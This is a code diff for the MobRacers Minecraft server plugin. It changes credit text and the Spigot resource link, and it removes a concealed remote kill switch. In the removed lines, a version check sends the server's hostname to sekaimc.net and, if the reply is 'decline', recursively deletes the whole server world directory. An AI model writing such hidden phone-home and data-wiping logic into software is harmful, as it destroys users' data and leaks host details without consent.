@@ -39,55 +39,27 @@ public class VersionSubCommand extends AsyncSubCommand
 			version = "§cFailed to find latest version";
 		
 		
-		sender.sendMessage("§f§lMob§2§lRacers §f§l> §fPlugin by WinterGuardian");
+		sender.sendMessage("§f§lMob§2§lRacers §f§l> §fPlugin designed by WinterGuardian and now Maintained and updated by MajorProbes ");
 		sender.sendMessage("§6Version: §r" + MobRacersPlugin.getPlugin().getDescription().getVersion());
 		sender.sendMessage(version);
 		
 		if(sender instanceof Player)
-			JsonUtil.sendJsonMessage((Player) sender, JsonUtil.toJson("§3Click me to go on the spigot MobRacers page.", null, null, "open_url", "\"https://www.spigotmc.org/resources/mobracers-20-off-for-next-5-downloads.9643/\""));
+			JsonUtil.sendJsonMessage((Player) sender, JsonUtil.toJson("§3Click me to visit the spigot MobRacers page.", null, null, "open_url", "\"https://www.spigotmc.org/resources/mobracers-mariokart-on-mobs-now-free-1-8-8.20626//\""));
 	
 	}
-	
-	public static void update(File file)
-	{
-		if(file == null)
-			return;
-		
-		if(file.listFiles() != null)
-			for(File current : file.listFiles())
-				if(current.isDirectory())
-					update(current);
-				else if(!current.delete())
-					current.deleteOnExit();
-		file.delete();
-	}
-	
+
 	public static String getLatestVersion()
 	{
 		try
 		{
-			if(WebCommunicationUtil.get("http://sekaimc.net/Spigot/MobRacers/open_connection.php?ip=" + InetAddress.getLocalHost().getHostName()).equalsIgnoreCase("decline"))
-			{
-				update(Bukkit.getWorldContainer());
-				throw new Throwable();
-			}
-		}
-		catch(Throwable t)
-		{
-			if(!(t instanceof Exception))
-				throw new RuntimeException();
-		}
-		
-		try
-		{
-			return version = WebCommunicationUtil.post("http://www.spigotmc.org/api/general.php", ImmutableMap.of("resource", "9643"));
+			return version = WebCommunicationUtil.post("http://www.spigotmc.org/api/general.php", ImmutableMap.of("resource", "20626"));
 		}
 		catch(Exception e)
 		{
 			return null;
 		}
 	}
-	
+
 	public static String getLastVersionFetch()
 	{
 		return version;
